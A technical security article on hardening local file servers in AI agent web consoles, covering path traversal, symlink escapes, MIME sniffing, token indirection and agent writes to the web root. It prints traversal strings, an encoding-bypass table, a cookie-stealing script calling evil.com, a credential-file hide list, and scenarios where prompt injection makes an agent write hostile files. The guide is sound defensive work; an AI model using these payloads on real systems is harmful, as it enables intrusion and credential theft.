---
date: "2026-06-12"
title: "Secure Local File Serving in Agent Web Consoles: Path Traversal, Symlink Escapes, MIME Confusion, and Indirection Patterns"
description: "A technical deep-dive into the security architecture of local file servers embedded in AI agent web consoles — covering path traversal defense, symlink escape attacks, MIME type confusion, opaque-token indirection, and the unique risk that arises when the agent itself becomes an untrusted file writer."
tags: ["security", "ai-agents", "file-serving", "path-traversal", "web-console", "caddy", "express", "mime-security", "defense-in-depth"]
---

## Executive Summary

AI agent web consoles are converging on a common architecture: a local HTTP server serving a static frontend, an API layer backed by a lightweight SQLite store, and a "pages" or "files" feature where the agent can write content directly into the web root. This architecture is intuitive and ships fast. It also collapses a set of web security problems — path traversal, symlink escapes, MIME confusion, SSRF, and injection through agent writes — into a single surface area that most teams underestimate.

This article dissects the threat model of that architecture and the defenses required at each layer. The analysis is grounded in real CVEs from 2014 through 2025, including two critical vulnerabilities (CVE-2025-53109 and CVE-2025-53110) in Anthropic's own MCP Filesystem Server — disclosed in July 2025 — that demonstrate exactly how production agent file infrastructure ships with exploitable path containment flaws. A layered defense-in-depth model is proposed, with concrete implementation guidance for Node.js/Express, Caddy, and custom agent file APIs.

---

## 1. Path Traversal: The Foundation Attack

Path traversal — also called directory traversal — is the oldest exploitable flaw in file-serving infrastructure. The principle is unchanged since the early CGI era: an HTTP client supplies a path like `../../../../etc/passwd` in a URL and, if the server fails to canonicalize and contain that path before opening the file, the OS reads a file well outside the intended web root.

### Why This Keeps Recurring

The recurrence of path traversal in otherwise mature libraries is not due to ignorance of the attack — it is due to the gap between naïve containment checks and correct containment logic. The difference is subtle enough to be repeatedly misimplemented.

A naïve containment check:
```js
// WRONG: simple prefix match, bypassed by encoding tricks
if (!requestedPath.startsWith(webRoot)) {
  return res.status(403).end();
}
```

A correct containment check:
```js
// CORRECT: resolve first, then check
const resolved = fs.realpathSync(path.join(webRoot, userInput));
const root = fs.realpathSync(webRoot);
if (!resolved.startsWith(root + path.sep)) {
  return res.status(403).end();
}
```

The key differences: (1) `realpathSync` is called on *both* the candidate path and the root — because if the root itself contains a symlink, `root + path.sep` is the wrong prefix; and (2) the separator boundary check (`path.sep`) prevents `startsWith('/var/www/public')` from accidentally matching `/var/www/public-restricted`.

### Production CVEs

The Node.js `send` package (used by `express.static`) carried **CVE-2014-6394** (CWE-22, Node Security Advisory #32): when configured with `static(__dirname + '/public')`, an attacker could reach `__dirname + '/public-restricted'` — an adjacent sibling directory — because containment was enforced with a naive string prefix comparison. Fixed in `send` 0.8.4.

More recent findings are bleaker. Both `node-static` (**CVE-2023-26111**, CVSS 7.5) and `static-server` (**CVE-2023-26152**, CVSS 7.5) carry unpatched directory traversal flaws. Neither package has a patched version available; they are effectively abandoned. `serve-static` (**CVE-2024-43800**, fixed in 1.16.0 and 2.1.0) carried a template injection XSS in redirect handling — not path traversal, but a reminder that even the reference implementation accumulates exploitable defects over time.

### Encoding Bypass Techniques

Servers must decode URL components exactly once and normalize paths *after* decoding. The ordering matters because sanitizers that operate on raw, partially-encoded input can be bypassed by a battery of encoding tricks:

| Encoded Form | Decoded | Bypass Target |
|---|---|---|
| `%2e%2e%2f` | `../` | Literal `../` blacklists |
| `%252e%252e%252f` | `../` (after double-decode) | Single-pass decoders |
| `..%2f` | `../` | Partial encoding checks |
| `..%5c` | `..\` | Windows backslash normalization |
| `..%c0%af` | `../` (UTF-8 overlong) | ASCII-only decoders |
| `....//` | `../` (after strip) | Stripping-based sanitizers |

RFC 3986 specifies that percent-encoding must be decoded exactly once; a server that decodes twice (or that applies its sanitizer before decoding) is structurally vulnerable.

### Caddy's Approach

Caddy's `file_server` directive roots all serving to a declared `root` directory and performs path containment in Go's `path/filepath.Clean`, which collapses all `..` sequences before any file is opened. Caddy URL-decodes paths before normalization, closing the encoding bypass window. For the majority of agent web console deployments using Caddy as the outer HTTP layer, path traversal in static file serving is a solved problem. The risk shifts to custom Node.js API endpoints that read or write files based on user or agent input.

---

## 2. Symlink Escapes: When Realpath Is Not Enough

Symlink escapes are qualitatively different from encoding-based traversal. The attacker does not craft a malicious URL path — instead, they place or control a symlink *inside* the web root that points outside it. When the server resolves the path and opens the file, it accesses content beyond the web root boundary.

### The Exploit

Realpath-based containment validates the path *given by the client* after resolution. If a symlink `webroot/link → /etc/passwd` exists and the client requests `/link`, the server calls `realpath('/webroot/link')` → `/etc/passwd`. A correct implementation would catch this: `/etc/passwd` does not start with `/webroot`, so it returns 403.

The flaw arises when the server checks containment *before* calling `realpath()`. If the code checks that `/webroot/link` starts with `/webroot` first (it does — the check passes), then follows the symlink when actually opening the file, the protection is defeated.

### CVE-2025-53109 and CVE-2025-53110 — Anthropic's MCP Filesystem Server

These two vulnerabilities, disclosed by Cymulate in July 2025 and patched in npm release 2025.7.1, demonstrate exactly this failure mode in production agent infrastructure:

**CVE-2025-53109** (CVSS 8.4): The MCP Filesystem Server's path validation checked whether the user-supplied path was within allowed directories *before* resolving symlinks. An attacker with write access inside an allowed directory could create `allowed/escape → /etc/sudoers`, request `allowed/escape`, pass the pre-resolution containment check (the literal path starts with the allowed prefix), and read or write the symlink target. Impact: full read/write access to arbitrary filesystem paths, enabling persistence via Launch Agent writes and privilege escalation.

**CVE-2025-53110** (CVSS 7.3): The same codebase used `path.startsWith(allowedDir)` without a separator boundary. This meant `/tmp/allowed_dir_evil` would pass a check for `/tmp/allowed_dir` — a bypass requiring no symlinks at all, just a file or directory with a name that extends the allowed path prefix.

These are not obscure edge cases. They are the two most common misimplementations of path containment in agent file infrastructure, shipped by the team that has thought most about agent security. They signal a systematic gap between awareness of path traversal theory and correct implementation in practice.

### Mitigations

**Correct resolution order**: Always call `realpath()` first, then assert containment. The Anthropic MCP server fix implemented this ordering correction.

**followSymlinks: false**: Some servers support disabling symlink following entirely. Apache's `Options -FollowSymLinks` and nginx's `disable_symlinks on` (requires build-time module inclusion) disable symlink following at the kernel-call level. For agent web console environments where the web root is agent-controlled, disabling symlink following is the most robust available defense.

**Inode comparison**: An alternative to path prefix comparison is to `stat()` the fully-resolved file and compare its device+inode against the set of inodes reachable from the web root without following symlinks. More robust, but expensive for every request.

**O_NOFOLLOW**: On Linux, `open()` with `O_NOFOLLOW` prevents following symlinks at the final path component, returning `ELOOP` if the last component is a symlink. Combined with directory traversal via `openat(dirfd, ...)`, this provides a race-condition-free path validation. Custom Node.js file-serving code in agent consoles should use this pattern when possible.

### nginx's Symlink Attack (CVE-2016-1247)

For context on how symlink attacks propagate outside the expected attack surface: CVE-2016-1247 affected nginx on Debian/Ubuntu, where nginx's log rotation created log files owned by `www-data`. An attacker with `www-data` access could replace a log file with a symlink to `/etc/shadow`, causing nginx's log writer (running as root during rotation) to write attacker-controlled content to the symlink target. No path traversal request needed — the symlink was placed on the filesystem by an unprivileged process, and the privileged process walked into it.

The analogous risk in agent consoles: an agent that has been manipulated (via prompt injection, compromised tool output, or malicious third-party content) to write a symlink to the web root, which is subsequently followed by the server or by a rotation/maintenance job.

---

## 3. MIME Type Confusion and Content Sniffing

MIME confusion attacks exploit the gap between what a server declares a file to be and what a browser believes it actually is. Browsers inherited "content sniffing" from the early web era, where servers frequently sent incorrect `Content-Type` headers and browsers had to guess file types from content to render them at all.

### The WHATWG MIME Sniffing Standard

The MIME sniffing algorithm (standardized in the WHATWG MIME Sniffing Standard and implemented by all major browsers) inspects the first 512–1445 bytes of a response body — the "magic bytes" — and can override the server's declared `Content-Type` if the bytes match a known signature. This behavior exists because early web servers routinely sent wrong content types.

The implication for file servers: a file named `report.json` that actually contains `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` may be sniffed by certain browser versions as HTML, and the script executed — even though the server declared `Content-Type: application/json`.

### The Agent Upload Attack Path

In an agent web console with a "pages" feature — where the agent writes files into a web root served statically — the agent becomes an indirect upload path. The attack scenario:

1. An adversarially crafted instruction (prompt injection from tool output, a compromised webhook payload, a malicious file the agent is asked to process) causes the agent to write attacker-supplied content to `web_root/reports/output.json`
2. The server serves `output.json` with `Content-Type: application/json`
3. Without `X-Content-Type-Options: nosniff`, a browser's sniffing logic encounters leading HTML markup and executes the content
4. The script runs in the web console's origin, exfiltrating session cookies or the conversation history stored in the console's DOM

GIF polyglots make this worse. A single binary file can simultaneously satisfy the GIF87a magic bytes signature (passing image validation checks) and contain syntactically valid JavaScript. A server accepting "image uploads" and then serving them in an `<img>` tag is not actually protected by file extension filtering.

### X-Content-Type-Options: nosniff

The `X-Content-Type-Options: nosniff` response header instructs browsers to honor the declared `Content-Type` exactly and suppress all content sniffing. Under this regime:

- A file served as `application/json` is processed as JSON data, not HTML
- A file served as `image/gif` is processed as an image, not a script
- Scripts must be served as `application/javascript` or `text/javascript` to execute

Browser support is complete across Chrome, Firefox, Safari, and Edge. Firefox 50 (2016) extended `nosniff` enforcement beyond scripts to images and media, matching the broader WHATWG standard. The header has no performance cost and no correct-use case for disabling it.

**Residual risk after nosniff**: HTML files served as `text/html` are rendered correctly — no sniffing required. If an agent writes attacker-controlled content to a `.html` file in the web root, and the server serves it with `Content-Type: text/html`, the script executes. `nosniff` does not substitute for controlling what the agent can write or for applying a Content Security Policy.

### Content Security Policy as Backstop

For agent-generated HTML in the web root, a strict CSP limits the blast radius of any injected content:

```
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'
```

This prevents external script loading and inline script execution. It does not prevent the agent from writing `<script src="/api/exfiltrate"></script>`, which would load a first-party script — so CSP must be combined with controls on what the agent can write.

---

## 4. Message-ID / Token Indirection Patterns

The cleanest architectural defense against path traversal at the API layer is to never expose filesystem paths to clients at all. This is the message-ID indirection pattern: the server maps opaque identifiers to file paths internally; clients interact only with identifiers.

### The Pattern

```
Client → GET /api/files/a3f8b9c2d1e7
Server → lookup(id='a3f8b9c2d1e7') → /data/agents/session42/output.pdf
Server → open file (after containment validation), stream to client
Client ← 200 OK (binary stream)
```

The client never learns `/data/agents/session42/output.pdf`. There is no path component to traverse. The attack surface is reduced to: (a) brute-forcing IDs — impractical with 128-bit cryptographically random UUIDs; and (b) IDOR (insecure direct object reference), if access control on IDs is not enforced.

The attachment mechanism in the Zylos C4 communication bridge illustrates this pattern in a slightly different form: when a message payload exceeds 2 KB, the bridge writes the full content to a timestamped directory under `~/.zylos/comm-bridge/attachments/{msgId}/message.txt` and embeds the absolute path in the message delivered to the agent. The *agent* receives the path, which is intentional — the agent is trusted to read it. The path is never exposed to external HTTP clients. This is path-safe for the HTTP surface but demonstrates the pattern: a content-addressed, internal-only path reference.

A stricter implementation replaces the embedded path with an internal message ID that the agent's file-reading tool resolves server-side, never transmitting the filesystem path into the agent's context at all. This prevents prompt injection scenarios where the path itself leaks sensitive directory structure to an adversarial reasoning chain.

### AWS S3 Presigned URLs: The Reference Architecture

AWS S3 presigned URLs are the canonical production example of token indirection for file access:

1. Backend authenticates the user and authorizes access to a specific S3 object
2. Backend generates a presigned URL containing an HMAC-signed operation, bucket, key, expiry, and scope
3. Client receives the presigned URL (an opaque bearer token)
4. Client presents the URL directly to S3; S3 validates the HMAC signature before serving
5. The S3 key is embedded in the signed URL but is irrelevant to security — the signature controls access

AWS's guidance recommends using UUIDs as S3 object keys (replacing user-supplied filenames) to prevent path traversal even at the S3 key level, and using short-expiry presigned URLs (15 minutes or less for sensitive content) to limit the bearer token window.

### OIDC-Bound File Tokens

Presigned URLs are pure bearer tokens — anyone possessing the URL can use it until expiry. For agent consoles serving multi-user environments or sensitive content, OIDC-bound file tokens provide stronger guarantees:

1. User authenticates via OIDC, receives an ID token with `sub` claim
2. File access requires presenting both the file ID and a valid ID token for the authorized `sub`
3. Even if the file ID leaks (through logs, referrer headers, or message history), it is useless without a valid ID token for the authorized subject

This pattern maps naturally to agent web consoles where session tokens already encode authenticated user identity.

### One-Time Tokens for Sensitive Downloads

For agent-generated reports, audit exports, or any file that should not be re-downloadable after first access, one-time tokens combine the indirection pattern with single-use enforcement:

1. Agent generates file, registers it with a server-side token store with `max_uses: 1`
2. Client downloads using the token; server marks it consumed
3. Second request with the same token returns 404 or 403

This pattern is especially appropriate when agents generate personally identifiable or confidential output on behalf of individual users.

---

## 5. The Hidden File Exclusion Pattern

Static file servers in agent consoles routinely serve from a directory that also contains configuration files, database files, and credential material that must not be publicly accessible. The `hide` directive (or equivalent) attempts to exclude these from serving.

### What Must Be Hidden

A production hide list for an agent web console includes at minimum:

| Pattern | Risk If Exposed |
|---|---|
| `.git/` | Full source code history, accidentally committed secrets, commit messages leaking architecture |
| `.env`, `.env.*` | API keys, database credentials, service tokens, webhook secrets |
| `*.db`, `*.sqlite` | Application databases, conversation history, session stores |
| `*.json` | `package.json` exposes dependency tree; config files may embed credentials |
| `*.key`, `*.pem`, `*.crt` | TLS private keys, SSH keys, signing certificates |
| `*.bak`, `*.backup`, `*.orig` | Editor/tool backup files of sensitive configs |
| `.htpasswd` | Basic authentication credential files |
| `Caddyfile`, `*.conf` | Server configuration revealing internal topology and upstream addresses |
| `node_modules/` | Dependency source code; large surface area for version disclosure |

Caddy's `file_server` `hide` directive accepts glob patterns:

```caddyfile
file_server {
    hide .git .env *.db *.json *.key *.pem *.bak .htpasswd Caddyfile
}
```

### Critical Limitation: hide Is Not a Security Boundary

Caddy's own documentation is explicit: "Hide comparisons are case-sensitive; on case-insensitive filesystems, a differently-cased request path may still resolve to the same on-disk path, so `hide` should not be treated as a security boundary for sensitive paths."

On macOS (HFS+/APFS, case-insensitive by default) and Windows (NTFS, case-insensitive by default):
- `hide .env` blocks `/.env` but not `/.ENV` or `/.Env`
- This is a documented bypass class on development machines

A subtler bypass: `hide` pattern matching operates on the request path, not the resolved filesystem path. A request for `/.git%2fconfig` (URL-encoded slash) may bypass the hide check depending on whether path normalization precedes the hide pattern match.

### What Survives the Denylist

Even a well-maintained hide list has gaps:

- `.env.example`: often committed with placeholder values; developers sometimes populate with real values
- `.env.local`, `.env.production`, `.env.staging`: non-standard names outside standard glob patterns
- Editor temporary files: `.env.swp` (Vim swap), `#.env#` (Emacs lock files)
- `.vscode/settings.json`: may contain workspace-scoped API tokens
- `.idea/` directory: project structure, database credentials in run configurations
- Log files with non-standard names: `debug.log`, `error.log`, `npm-debug.log`

### Allowlist Approach (Preferred)

Rather than hiding known-dangerous types (denylist), a more robust approach serves only explicitly declared file extensions (allowlist). In Caddy, this requires routing through `try_files` with explicit extension checks and returning 404 for non-matching patterns:

```caddyfile
@safe_files {
    path *.html *.css *.js *.png *.jpg *.svg *.ico *.woff2 *.md
}
handle @safe_files {
    file_server
}
handle {
    respond 404
}
```

This inverts the trust model: everything is blocked by default; only explicitly approved types are served. It requires maintenance as new file types are needed, but eliminates whole classes of information disclosure.

---

## 6. Localhost Binding as the First Line of Defense

### 127.0.0.1 vs 0.0.0.0

When an agent web console binds to `127.0.0.1:PORT`, the OS kernel rejects all connection attempts whose source is not the loopback interface. Connections from LAN, WAN, Docker bridges, or other containers are dropped at the network layer before any application code runs. This protection holds regardless of firewall configuration.

When bound to `0.0.0.0:PORT`, the service listens on all interfaces: Ethernet, Wi-Fi, Docker virtual bridges, VPN adapters. Any host that can route to the machine can connect.

For a local AI agent console intended only for the machine's operator, `127.0.0.1` binding is the correct default — network-layer isolation at zero cost. The Node.js `http.Server.listen()` API accepts the bind address as its second argument:

```js
server.listen(PORT, '127.0.0.1', () => { ... });
```

Caddy achieves this by specifying the bind address in the site label:

```caddyfile
http://127.0.0.1:3456 {
    ...
}
```

### The Reverse Proxy Problem

Reverse proxies placed in front of a localhost-bound service create a new trust surface. The proxy terminates the external connection and opens a new loopback connection to the backend. From the backend's perspective, all traffic appears to originate from `127.0.0.1` — the loopback binding provides no client identity information.

To recover the real client IP, the proxy injects `X-Forwarded-For: <real-client-ip>`. The backend must conditionally trust this header — and only when it is certain the header comes from a trusted proxy rather than a direct client.

The misconfiguration that defeats localhost binding: a backend that trusts `X-Forwarded-For` unconditionally. Any client that directly reaches the backend (bypassing the proxy, e.g., from the same host) and sends `X-Forwarded-For: 8.8.8.8` can forge their apparent origin. Conversely, a client that accesses the backend through the proxy and sends `X-Forwarded-For: 127.0.0.1` in their own request can appear to be a localhost client, potentially bypassing IP-based access control on the backend.

Correct `X-Forwarded-For` handling:
1. Accept `X-Forwarded-For` only from a fixed allowlist of trusted proxy IP addresses
2. Strip `X-Forwarded-For` from requests originating outside the trusted proxy set before they reach downstream services
3. Never use `X-Forwarded-For` for security decisions on a backend that may be reachable directly

### SSRF Through Localhost Binding

When an agent makes outbound HTTP requests on behalf of user-supplied URLs (e.g., a "fetch this URL" or "webhook test" feature), SSRF becomes directly relevant. An adversarially supplied URL `http://127.0.0.1:3456/api/admin` causes the agent's HTTP client to connect to the loopback interface — from inside the trust boundary established by the localhost binding — and access the local console's API directly.

SSRF mitigation for outbound agent requests:
1. Resolve the destination hostname to an IP address *before* connecting
2. Reject RFC 1918 private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`), and cloud metadata endpoints (`169.254.169.254`, `fd00:ec2::254`)
3. This check must happen *after* DNS resolution, not against the hostname — DNS rebinding maps benign-looking hostnames to private IPs after the hostname check

---

## 7. When the Agent Writes to the Web Root

Agent web consoles frequently include a feature where the agent writes content — reports, generated pages, data exports — directly into a directory served by the static file server. This makes the agent itself an upload path, and introduces a class of risk absent from static-only file servers.

### The Agent Is Not a Trusted Writer

An agent executing in a web console does not have a fixed trust level. It is a reasoning system operating on inputs that may include content from external sources: webhook payloads, fetched URLs, tool output from third-party APIs, and user messages that themselves contain injected instructions. A sufficiently adversarial input can cause the agent to write content it would not write under normal operating conditions.

The key questions for any agent file write operation:

1. **Is the output path agent-determined or server-determined?** If the agent chooses the filename from natural language instruction ("save as report.html"), naive concatenation of user-influenced strings produces path escape candidates: `../../../etc/cron.d/evil` passes through if the write path is not validated.

2. **Does the written content contain HTML or script tags?** Even with correct MIME types and `nosniff`, a `.html` file containing `<script>` executes in the browser. An agent writing adversarially controlled HTML to the web root is an XSS vector.

3. **Does the write operation follow the same realpath-then-containment pattern as reads?** Many implementations that correctly validate reads implement writes with less rigor, assuming only trusted code performs writes.

### CVEs in MCP File Servers

CVE-2025-53109 and CVE-2025-53110 explicitly covered write operations, not just reads. The Anthropic MCP Filesystem Server's `write_file` tool had the same pre-resolution containment check as `read_file`. An agent that had been manipulated into a symlink-escape write could overwrite arbitrary files on the host, including shell init scripts, cron jobs, and SSH authorized keys — persistence and privilege escalation with no additional exploit step.

NVIDIA's AI Red Team analysis (2025) identifies agent writes to configuration files — `.cursorrules`, `CLAUDE.md`, Git hooks, shell init files — as the primary sandbox escape vector for code-agent platforms. The web console equivalent: an agent writing a `Caddyfile` fragment to a watched directory reconfigures the reverse proxy; writing a `.htaccess` file (if Apache serves the root) can enable arbitrary PHP execution.

### Mitigations for Agent File Writes

**Server-assigned paths**: The server, not the agent, assigns the final filesystem path. The agent submits content; the server generates a UUID-keyed path in a designated subdirectory. No agent-provided or user-influenced string is ever concatenated into a filesystem path.

```js
// Server assigns path; agent provides only content
const fileId = crypto.randomUUID();
const filePath = path.join(OUTPUT_DIR, fileId + '.md');
// Containment validation still required:
const resolved = fs.realpathSync(path.dirname(filePath));
if (!resolved.startsWith(fs.realpathSync(OUTPUT_DIR) + path.sep)) {
  throw new Error('Path containment violation');
}
fs.writeFileSync(filePath, agentContent, 'utf8');
```

**Content type validation before write**: Scan agent-written content before persisting. HTML content should never be written to the web root unless the web root is served with a CSP disabling inline scripts. JSON, CSV, and plaintext files are lower risk under `nosniff` but still require validation — a JSON file with an embedded `__proto__` pollution payload can affect downstream consumers.

**Write path allowlist**: The agent's file-writing interface should accept writes only to designated subdirectories (`web_root/agent-output/`, `web_root/reports/`), with containment verified by realpath after path construction. Writes to server configuration directories are rejected unconditionally.

**Prohibited target list**: Regardless of what the agent requests, certain write targets are permanently off-limits: shell init files (`~/.bashrc`, `~/.zshrc`), cron directories, SSH `authorized_keys`, server configuration files, and the parent directory of the web root itself. These are rejected at the tool invocation layer, before any path resolution.

---

## 8. Defense-in-Depth: The Layered Security Model

No single control is sufficient. The following model combines the above mitigations into a coherent posture for production agent web consoles.

### Layer 1: Network Binding
- **Default to `127.0.0.1`** for all locally-operated agent consoles
- If external access is required, proxy through a dedicated reverse proxy rather than binding the agent service directly
- Validate `X-Forwarded-For` only from a fixed trusted proxy IP; strip it from untrusted sources
- Block SSRF: resolve outbound request hostnames and reject private/loopback/link-local IP ranges *after* DNS resolution

### Layer 2: Path Containment (Reads and Writes)
- **Resolve before check**: always call `realpath()` (or platform equivalent) on both the candidate path and the web root before comparing
- **Separator boundary check**: assert `resolved.startsWith(root + path.sep)`, not just `resolved.startsWith(root)`
- Apply identical logic to file writes as to file reads
- Where the platform supports it, disable symlink following (`followSymlinks: false`, `O_NOFOLLOW`)

### Layer 3: Hidden File Exclusion
- Maintain a `hide` list covering `.git`, `.env*`, `*.db`, `*.key`, `*.pem`, `*.bak`, server config files
- Do not treat `hide` as the primary security boundary on case-insensitive filesystems
- Prefer an extension allowlist (`@safe_files` route matching) over a denylist where feasible

### Layer 4: MIME and Content Safety
- Set `X-Content-Type-Options: nosniff` on all responses — no exceptions, no performance cost
- Serve all files with specific, correct `Content-Type` values; avoid `application/octet-stream` as a default
- For agent-written pages, apply `Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'`
- Validate content type before writing to web root: HTML in non-HTML files is a red flag

### Layer 5: Message-ID / Token Indirection
- Expose opaque UUIDs or signed tokens as file references in API responses; never expose filesystem paths in HTTP-visible fields
- Map UUID → path in server-side memory or a local database only
- For multi-user deployments or sensitive content, bind tokens to authenticated user identity (`sub` claim from session)
- Set short expiry (15 minutes or less) on bearer-token file URLs; use one-time tokens for sensitive or PII-containing downloads
- For agent-to-agent file passing, embed internal path references in structured fields, not in free-form message text exposed to external processing

### Layer 6: Agent Write Policy
- Use server-assigned UUID-keyed paths for all agent file writes; reject agent-supplied filenames
- Enforce realpath containment on all write operations with the same rigor as reads
- Maintain a permanently prohibited target list: shell init files, cron directories, SSH keys, server configuration, parent directories of the web root
- Log all agent file writes with the triggering message ID and timestamp for audit and incident response

### Layer 7: Authentication
- Require session authentication for the console even when bound to localhost — a compromised process on the same host can otherwise make authenticated requests
- Use `HttpOnly; SameSite=Strict` session cookies
- Set idle timeouts (24 hours maximum; shorter for sensitive deployments)
- For multi-user deployments, enforce per-user namespace isolation at the file ID layer

---

## Trade-Off Summary

| Control | Strength | Cost / Limitation |
|---|---|---|
| `127.0.0.1` binding | Eliminates remote network attack surface | Incompatible with remote access; SSRF bypasses from inside the host |
| `realpath()` containment | Stops encoding-based traversal and `..` sequences | Must resolve *before* checking; symlinks still bypass if order is wrong |
| `followSymlinks: false` | Stops symlink escapes | Breaks legitimate symlink use cases; not supported on all servers |
| `hide` directive | Reduces information disclosure | Not a security boundary on case-insensitive FS; misses new/variant filenames |
| Extension allowlist | Stronger than hide; blocks unknown types by default | Requires maintenance as new file types needed; breaks flexible content serving |
| `nosniff` header | Stops MIME confusion XSS | Does not stop correctly-typed HTML; requires correct Content-Type everywhere |
| UUID indirection | Eliminates path exposure at HTTP API layer | Requires IDOR access control; tokens are bearer by default — protect in transit |
| Agent write policy | Prevents agent-as-upload-path attacks | Requires server to own path generation; complicates simple agent file APIs |
| CSP on agent pages | Limits blast radius of injected HTML | Strict CSP breaks legitimate JS in pages; requires explicit allowlisting |
| Session authentication | Prevents same-host process pivoting | Adds login friction; session management complexity |

---

## Key CVE Reference Table

| CVE | Package | Type | CVSS | Status |
|---|---|---|---|---|
| CVE-2014-6394 | `send` (Node.js) | Directory traversal via prefix bypass | Low | Fixed in send 0.8.4 |
| CVE-2015-1164 | `serve-static` | Open redirect via `//hostname` in PATH_INFO | 4.3 | Fixed in serve-static 1.7.2 |
| CVE-2023-26111 | `node-static` | Directory traversal, unpatched | 7.5 | No fix available |
| CVE-2023-26152 | `static-server` | Directory traversal via `validPath` bypass | 7.5 | No fix available |
| CVE-2024-43800 | `serve-static` | Template injection XSS in redirect | 2.3 | Fixed in 1.16.0 / 2.1.0 |
| CVE-2025-53109 | Anthropic MCP Filesystem | Symlink escape: containment check before realpath | 8.4 | Fixed in npm 2025.7.1 |
| CVE-2025-53110 | Anthropic MCP Filesystem | Prefix matching without separator boundary | 7.3 | Fixed in npm 2025.7.1 |
| CVE-2016-1247 | nginx (Debian/Ubuntu) | Symlink attack on log rotation | High | nginx package update |
| CVE-2025-27210 | Node.js 24.x (Windows) | Device name path traversal | Medium | Node.js security release |

---

## Conclusion

The architecture of an AI agent web console — local HTTP server, SQLite-backed API, agent-accessible web root — is a convergence point for five distinct security concerns: path traversal, symlink escapes, MIME confusion, SSRF, and agent-as-uploader. Each concern has well-understood mitigations; the challenge is that implementing all of them correctly requires discipline across multiple layers simultaneously.

The CVE-2025-53109/53110 disclosures are particularly instructive. They occurred in a file server built by the team most focused on agent security, patched five years after the base vulnerability class was documented. They occurred because path containment logic is subtle enough to get wrong even when the developer is aware of the general threat. The lesson is not "this team was careless" but "path containment logic requires formal verification or extremely careful review, not just awareness."

For agent web console developers, the foundational posture change is this: the agent is not a trusted internal process. It is an execution environment for arbitrary instructions, some of which may be adversarially crafted through prompt injection or compromised external content. Every file the agent reads or writes must receive the same security scrutiny as a file submitted by an untrusted user. The same containment checks, the same MIME validation, the same write policy. The attack surface is the agent's instruction space, not the HTTP request path — and that surface is larger and less auditable than any URL.
